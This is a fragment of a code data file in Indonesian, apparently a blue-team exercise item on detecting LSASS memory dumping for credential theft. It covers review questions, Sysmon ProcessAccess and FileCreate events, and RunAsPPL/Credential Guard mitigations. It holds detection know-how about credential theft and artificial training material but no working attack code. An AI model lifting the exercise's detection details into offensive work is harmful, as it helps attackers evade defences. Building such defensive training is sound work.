      "Evidence mana yang membuktikan upaya pencurian kredensial memori LSASS?",
      "Apakah ada kemungkinan false positive jika crash dump resmi dibuat oleh Windows Error Reporting?",
      "Bagaimana cara memvalidasi keputusanmu dengan melihat call trace ntdll.dll?",
      "Mitigasi apa yang mengisolasi LSASS di dalam ruang memori terlindung (PPL)?"
    ],
    lapsMapping: {
      understand: "Memahami ancaman pencurian hash NTLM/kredensial melalui dump memori proses LSASS.",
      plan: "Menganalisis Sysmon Event ID 10 (ProcessAccess) dan Event ID 11 (FileCreate).",
      execute: "Mengekstrak mask GrantedAccess dan berkas dump target.",
      review: "Mengonfigurasi LSA RunAsPPL dan Credential Guard pada Windows Server."
    }
  }
];
